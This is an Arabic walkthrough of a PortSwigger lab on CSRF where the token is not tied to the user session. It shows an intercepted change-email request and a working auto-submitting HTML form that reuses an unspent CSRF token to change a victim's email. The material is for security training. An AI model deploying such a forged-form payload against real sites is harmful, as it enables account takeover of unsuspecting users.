# [CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

## **`الهدف`**
إنشاء كود `HTML` يقوم بعمل هجوم `CSRF` بحيث يغير الـ `email` الخاص بالضحية.
## **`خطوات الحل`**
نقوم بتسجيل الدخول إلى حساب `wiener:peter`، ونقوم بعمل تغيير البريد الإلكتروني وإعتراض الـ `request`
```http
POST /my-account/change-email HTTP/2
Host: 0a8a00db0377a87380e4032500de007b.web-security-academy.net
Cookie: session=Prpg374nSfnM5slibR6Hvt9BC4TZxRH2

email=king%40dontwannacry.com&csrf=Hg6OO2oBevgb9jJdKaX0M0jvVoScuFhl
```

ونقوم بعمل `drop` للـ `request` لكي لا يتم حرق الـ `CSRF Token`، لأن الثغرة في هذه اللاب أن التوكن غير مربوط بجلسة المستخدم لذلك مالم يتم استخدامه فيمكن لأي مستخدم أخر استخدامه.

**`خطوة إختيارية:`** بسبب أن هذا لاب فنحن نعلم بوجود الثغرة بالفعل ولكن إكتشاف هذه الثغرة في الواقع عند اختبار موقع حقيقي ستحتاج للدخول إلى حساب أخر تمتلكه لتختبر عدة فرضيات مثل هل الـ `csrf token` مرتبط بحساب المستخدم أم أنه يعمل على أى حساب وهل يتم حرقه بعد الإستخدام أم لا وعدة فرضيات أخرى ولذلك فهذا اللاب يوفر لك حساب أخر وهو `carlos:montoya` حتى تختبر هذه الفرضيات إذا أردت ذلك.

وبعد ذلك نقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونضع السكريبت التالي في خانة `Body`.
```html
<form method="POST" action="https://0a8a00db0377a87380e4032500de007b.web-security-academy.net/my-account/change-email"> 
    <input type="hidden" name="email" value="test@test.com"> 
    <input type="hidden" name="csrf" value="Hg6OO2oBevgb9jJdKaX0M0jvVoScuFhl"> 
</form> 
<script> 
        document.forms[0].submit(); 
</script>
```
بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [CSRF vulnerability with no defenses](./CSRF-vulnerability-with-no-defenses.md)
